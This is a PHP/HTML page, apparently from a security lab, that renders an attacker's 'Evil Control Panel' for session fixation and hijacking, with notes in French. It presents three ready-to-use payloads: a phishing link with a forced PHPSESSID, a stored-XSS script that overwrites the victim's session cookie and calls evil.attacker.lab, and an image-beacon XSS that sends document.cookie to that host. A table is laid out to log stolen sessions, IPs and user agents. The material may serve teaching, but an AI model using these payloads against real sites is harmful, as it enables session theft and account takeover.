<?php
// attacker-server/public/index.php — dashboard temps réel "Evil Control Panel"
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>☠ Evil Control Panel</title>
    <link rel="stylesheet" href="/style.css">
</head>
<body class="evil">

<header>
    <h1>☠ Evil Control Panel</h1>
    <div class="status">
        <span class="led" id="led"></span>
        <span>Listener actif sur <code>evil.attacker.lab/collect.php</code></span>
        <span class="count">Sessions volées : <strong id="count">0</strong></span>
    </div>
</header>

<section class="payloads">
    <h2>Payloads prêts à l'emploi</h2>

    <details open>
        <summary>Vecteur A — Fixation via paramètre URL (PHPSESSID)</summary>
        <pre><code id="payload-a">http://vuln.bank.local/login.php?PHPSESSID=ATTACKER_FIXED_SID_001</code></pre>
        <p>L'attaquant envoie ce lien à la victime (phishing). PHP avec <code>use_trans_sid=1</code> et <code>use_strict_mode=0</code> accepte le SID.</p>
    </details>

    <details>
        <summary>Vecteur B — Fixation par XSS stocké</summary>
        <pre><code>&lt;script&gt;
document.cookie = "PHPSESSID=ATTACKER_FIXED_SID_001; path=/";
fetch("http://evil.attacker.lab/collect.php?m=stored-xss-cookie-set"
      + "&amp;sid=ATTACKER_FIXED_SID_001"
      + "&amp;url=" + encodeURIComponent(location.href));
&lt;/script&gt;</code></pre>
        <p>Posté dans un commentaire, ce payload s'exécute pour tout visiteur. Cookie écrasé chez la victime + ping à notre serveur.</p>
    </details>

    <details>
        <summary>Vecteur C — Exfiltration directe du cookie après hijack</summary>
        <pre><code>&lt;img src=x onerror="
  new Image().src='http://evil.attacker.lab/collect.php?m=stolen'
    + '&amp;c=' + encodeURIComponent(document.cookie)
    + '&amp;url=' + encodeURIComponent(location.href);
"&gt;</code></pre>
        <p>Si le cookie n'est pas HttpOnly (cas vuln), JS le lit. Image-beacon → log dans notre dashboard.</p>
    </details>
</section>

<section class="harvest">
    <h2>Sessions interceptées</h2>
    <table id="tbl">
        <thead>
            <tr>
                <th>#</th>
                <th>Quand</th>
                <th>SID</th>
                <th>Cookie complet</th>
                <th>Méthode</th>
                <th>URL victime</th>
                <th>IP</th>
                <th>UA</th>
                <th></th>
            </tr>
        </thead>
        <tbody id="rows"></tbody>
    </table>
</section>

<script src="/dashboard.js"></script>
</body>
</html>
